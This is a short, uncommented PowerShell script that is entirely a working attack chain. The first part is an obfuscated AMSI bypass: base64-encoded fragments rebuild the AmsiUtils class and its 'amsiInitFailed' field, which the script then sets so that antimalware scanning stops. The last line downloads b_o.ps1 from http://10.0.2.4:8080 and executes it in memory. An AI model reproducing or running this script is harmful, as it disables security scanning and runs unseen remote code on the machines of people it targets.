${/=\/\_/\/\/\/\_/\}=[Ref].Assembly.GetType('Sy'+'s'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0A')))+'.'+'Ma'+'n'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'me'+''+'n'+'t'+'.A'+'u'+'t'+'om'+'a'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAG8AbgAuAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA'))));
${________/=\_/\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBRAEIAdABBAEgATQBBAGEAUQBCAEoAQQBHADQAQQBhAFEAQgAwAEEARQBZAEEAWQBRAEIAcABBAEcAdwBBAFoAUQBCAGsAQQBBAD0APQA=')))
${/=\/\_/\/\/\/\_/\}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${________/=\_/\/=\}))),'N'+'on'+'P'+'ub'+'l'+''+'i'+'c,'+'St'+'a'+'t'+'ic').Setvalue($Null,$true);

sleep 5
iex (New-Object Net.WebClient).downloadString('http://10.0.2.4:8080/b_o.ps1')
